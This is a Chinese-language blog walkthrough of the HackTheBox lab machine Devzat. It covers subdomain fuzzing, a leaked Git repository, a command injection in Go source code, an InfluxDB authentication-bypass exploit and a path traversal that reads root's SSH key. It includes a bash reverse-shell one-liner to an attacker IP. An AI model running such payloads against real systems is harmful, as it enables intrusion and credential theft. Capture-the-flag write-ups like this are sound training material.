---
title: Devzat
date: 2022-01-31 23:10:17
tags: HackThebox
categories: RCE
---

## 信息收集
目标主机开放了web服务、ssh服务和另外一个在8000端口开放的ssh服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/21b6d282e8da4c69b98366ce01e46824.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试连接8000端口的ssh服务，发现是一个聊天窗口
![在这里插入图片描述](https://img-blog.csdnimg.cn/84313fe1057f44c28891d502ea10fcc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

查看完可执行的命令后，还是没有新的发现
![在这里插入图片描述](https://img-blog.csdnimg.cn/c177659919d14648a3242a3318b51298.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)


访问web服务时，发现只是一个普通的推销网站而已，并且扫描目录文件时也没有发现有价值的信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/09ad4566419a4b90b458ab4f5f54788e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

```bash
dirsearch -u "http://devzat.htb/" -e * -x404,403,500 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/0551196c84a14524bac03c2c69952c82.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

既然没有有价值的信息，那么我们就得切换思路了，我们得尝试扫描是否存在子域名，存在一个pets子域

```bash
wfuzz -c -u "http://devzat.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26 -H "HOST:FUZZ.devzat.htb"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a70274adbfa948bcab7740d140f6fe6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
访问子域网站的页面，发现是一个添加宠物姓名的一个功能站点
![在这里插入图片描述](https://img-blog.csdnimg.cn/73950ecdc3994db6b934d94aa67e3f72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们对这个url路径进行目录扫描，发现了一个git源码泄露

```bash
dirsearch -u "http://pets.devzat.htb" -e * -x404,403,500 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/70fc1cc7625040a2bcde7d064b309483.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
访问目录时，我们发现存在以下目录。我们使用GitTools工具还原源码数据
![在这里插入图片描述](https://img-blog.csdnimg.cn/cb028e4f2ddc4b189d580d34c06a58cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a5825b6e5ff54569803bb1b78576105d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e0022a2d30b943f0b4f8baaef52c3697.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
还原出源码之后，我们看到存在一个main.go文件，我们可以打开main.go文件审计源码看看是否存在漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/c8a248995b4147deb28e8f0b50c74a47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 漏洞利用
我们看到代码`cmd := exec.Command("sh", "-c", "cat characteristics/"+species)`处存在一个命令注入，而且功能处是添加species种类处，我们可以利用这点执行恶意的代码。

```go
package main

import (
	"embed"
	"encoding/json"
	"fmt"
	"io/fs"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"time"
)

//go:embed static/public
var web embed.FS

//go:embed static/public/index.html
var index []byte

type Pet struct {
	Name            string `json:"name"`
	Species         string `json:"species"`
	Characteristics string `json:"characteristics"`
}

var (
	Pets []Pet = []Pet{
		{Name: "Cookie", Species: "cat", Characteristics: loadCharacter("cat")},
		{Name: "Mia", Species: "cat", Characteristics: loadCharacter("cat")},
		{Name: "Chuck", Species: "dog", Characteristics: loadCharacter("dog")},
		{Name: "Balu", Species: "dog", Characteristics: loadCharacter("dog")},
		{Name: "Georg", Species: "gopher", Characteristics: loadCharacter("gopher")},
		{Name: "Gustav", Species: "giraffe", Characteristics: loadCharacter("giraffe")},
		{Name: "Rudi", Species: "redkite", Characteristics: loadCharacter("redkite")},
		{Name: "Bruno", Species: "bluewhale", Characteristics: loadCharacter("bluewhale")},
	}
)

func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}

func getPets(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(Pets)
}

func addPet(w http.ResponseWriter, r *http.Request) {
	reqBody, _ := ioutil.ReadAll(r.Body)
	var addPet Pet
	err := json.Unmarshal(reqBody, &addPet)
	if err != nil {
		e := fmt.Sprintf("There has been an error: %+v", err)
		http.Error(w, e, http.StatusBadRequest)
		return
	}

	addPet.Characteristics = loadCharacter(addPet.Species)
	Pets = append(Pets, addPet)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, "Pet was added successfully")
}

func handleRequest() {
	build, err := fs.Sub(web, "static/public/build")
	if err != nil {
		panic(err)
	}

	css, err := fs.Sub(web, "static/public/css")
	if err != nil {
		panic(err)
	}

	webfonts, err := fs.Sub(web, "static/public/webfonts")
	if err != nil {
		panic(err)
	}

	spaHandler := http.HandlerFunc(spaHandlerFunc)
	// Single page application handler
	http.Handle("/", headerMiddleware(spaHandler))

	// All static folder handler
	http.Handle("/build/", headerMiddleware(http.StripPrefix("/build", http.FileServer(http.FS(build)))))
	http.Handle("/css/", headerMiddleware(http.StripPrefix("/css", http.FileServer(http.FS(css)))))
	http.Handle("/webfonts/", headerMiddleware(http.StripPrefix("/webfonts", http.FileServer(http.FS(webfonts)))))
	http.Handle("/.git/", headerMiddleware(http.StripPrefix("/.git", http.FileServer(http.Dir(".git")))))

	// API routes
	apiHandler := http.HandlerFunc(petHandler)
	http.Handle("/api/pet", headerMiddleware(apiHandler))
	log.Fatal(http.ListenAndServe(":5000", nil))
}

func spaHandlerFunc(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write(index)
}

func petHandler(w http.ResponseWriter, r *http.Request) {
	// Dispatch by method
	if r.Method == http.MethodPost {
		addPet(w, r)
	} else if r.Method == http.MethodGet {
		getPets(w, r)

	} else {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
	// TODO: Add Update and Delete
}

func headerMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Server", "My genious go pet server")
		next.ServeHTTP(w, r)
	})
}

func main() {
	resetTicker := time.NewTicker(5 * time.Second)
	done := make(chan bool)

	go func() {
		for {
			select {
			case <-done:
				return
			case <-resetTicker.C:
				// Reset Pets to prestaged ones
				Pets = []Pet{
					{Name: "Cookie", Species: "cat", Characteristics: loadCharacter("cat")},
					{Name: "Mia", Species: "cat", Characteristics: loadCharacter("cat")},
					{Name: "Chuck", Species: "dog", Characteristics: loadCharacter("dog")},
					{Name: "Balu", Species: "dog", Characteristics: loadCharacter("dog")},
					{Name: "Georg", Species: "gopher", Characteristics: loadCharacter("gopher")},
					{Name: "Gustav", Species: "giraffe", Characteristics: loadCharacter("giraffe")},
					{Name: "Rudi", Species: "redkite", Characteristics: loadCharacter("redkite")},
					{Name: "Bruno", Species: "bluewhale", Characteristics: loadCharacter("bluewhale")},
				}

			}
		}
	}()

	handleRequest()

	time.Sleep(500 * time.Millisecond)
	resetTicker.Stop()
	done <- true
}

```
为了检测我们的代码可以成功运行，我们可以先使用ping命令检测是否能ping通我们本地的机器，抓包工具选择tcpdump较为方便
![在这里插入图片描述](https://img-blog.csdnimg.cn/6e33b2b67b2f4a719b747c1cd9ac9c6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7c8fd2469cb14d8d9e75f60d9188bfca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
返回的结果是成功执行了命令，那么我们可以将我们的恶意代码进行base64编码，目的是为了确保命令执行时不会出现渲染问题。payload的设置是：先将编码的字符串进行解码，解码之后传给管道符以bash命令运行

```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.44/4444 0>&1' | base64
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ccb0abeb9681491f9ac925d4249f715a.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ba6d6ecae5746bba902f3b7f0b88eb6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
反弹shell到本地机器上
![在这里插入图片描述](https://img-blog.csdnimg.cn/22566d53b80f46d79d780b9871c10674.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权到catherine
拿到shell后，发现我们并没有权限查看user.txt文件的权限，并且home目录下存在另一个账户`catherine`。初步判断应该是要提权到这个用户权限上。我们使用万能提权脚本`linpeas.sh`上传到目标机器上运行，发现目标机器上以root权限运行着一个docker代理程序，并且运行的端口为8086
![在这里插入图片描述](https://img-blog.csdnimg.cn/7af7e79e6cb54a40b1dc0c7b52e9be19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
因为目标机器的8086端口对外网不开放，所以我们必须使用内网穿透工具，利用端口转发技术将8086端口转发到我们的VPS机器上进行访问，所使用的工具是frp。我们先上传客户端到目标机器上，并在本机上运行服务端
![在这里插入图片描述](https://img-blog.csdnimg.cn/a16b934148f34fa8a7b8a708f2178fea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
客户端配置信息，server_addr是本机地址，server_port不用更改，local_port是要转发到本地机器的端口，remote_port是要被转发的机器的目标端口
![在这里插入图片描述](https://img-blog.csdnimg.cn/df2fddfbe7544441b83fd61835a4b155.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
穿透代理搭建成功后，我们可以扫描本地机子的8086端口，了解到开放的是`InfluxDB`服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/3ca9e0134de24babb975067b86a49651.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
在EDB上尝试过很多的exp，但是都没有成功。但是在github上发现了一个披露了的exp，经过验证发现可以利用成功，链接地址为[https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3f3e1f4fbd72404f823d75c83181d7fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现了两个数据库，一个数据表，并查询数据表的信息，发现了`catherine`用户名的密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/350fb64176ea4290b7efdb38a6d9e844.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/db24633ea9ea427fa1d00fcdf845252b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/9dbe54a67fd7458c9132ff68b0285457.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么就获取到了user.txt文件的权限了
![在这里插入图片描述](https://img-blog.csdnimg.cn/32ae8ee62ba2425a94b71552d0a6f221.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权到ROOT
没办法，我们找二进制文件也没找到个所以然，只能再运行一遍神器`linpeas.sh`这个脚本了。在`/var/backups`这个目录上，发现了很多有趣的文件，如`devzat-main.zip、devzat-dev.zip`这两个压缩包
![在这里插入图片描述](https://img-blog.csdnimg.cn/c525a8de4c3d4b40a111283e562b2b51.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
将其复制到tmp目录解压，查看其中的commands.go文件存在可利用的漏洞点，比较main目录和dev目录下的commands.go文件的不同发现有一处对密码进行校验。这里我们要注意两个点，一个是fileCommand的方法，另一个是校验安全密码，如果密码不对直接结束方法。

```bash
diff commands.go ../dev/commands.go
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/29c143180e4443d18159280a01e19b46.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
在审计GO代码时，我们发现对应的方法名字就是我们能执行命令的名字，但是唯独缺少了这个file命令，而且还存在校验密码的环节，所以很有可能是突破口。在审计dev目录下的`devchat.go`文件发现，dev目录的功能是运行在目标主机的8443端口
![在这里插入图片描述](https://img-blog.csdnimg.cn/7394175f0acc43df862c9682f307a261.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/8ea29539414a45bd9212598564ebf766.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
但是我发现在反弹的shell中，并不能实现ssh的内部端口连接。但是很幸运我在.ssh中找到了登录凭据
![在这里插入图片描述](https://img-blog.csdnimg.cn/498aedec26e24f7992495a71c3752cc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7bb674ed77754fd983ba72c1fca5871a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
成功使用patrick账户登录
![在这里插入图片描述](https://img-blog.csdnimg.cn/c15e1617dda34fca9a8907f068b10ba9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现没有密码，均报错
![在这里插入图片描述](https://img-blog.csdnimg.cn/e925745b20b0407da04aac8ff435be8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试使用密码看看返回信息有什么不同，它说不存在这个目录，那我们返回上一目录直接读取到flag了
![在这里插入图片描述](https://img-blog.csdnimg.cn/4e14ed39838a46aeaffee1d47487d666.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/81bc37ed464242f087cb32aea8552a80.png)
同时我们也可以读取root的id_rsa进行获取root权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/ceb27ddf47dd414e87f7ecebb2dc7d59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/aa49ba11351148f482600c39b2b45ceb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 总结
总的来说这个靶机相当复杂，同时考验GO语言的代码审计能力，获取权限的方式比较复杂，但是更加偏向于实战，这是一个非常出色的靶机。
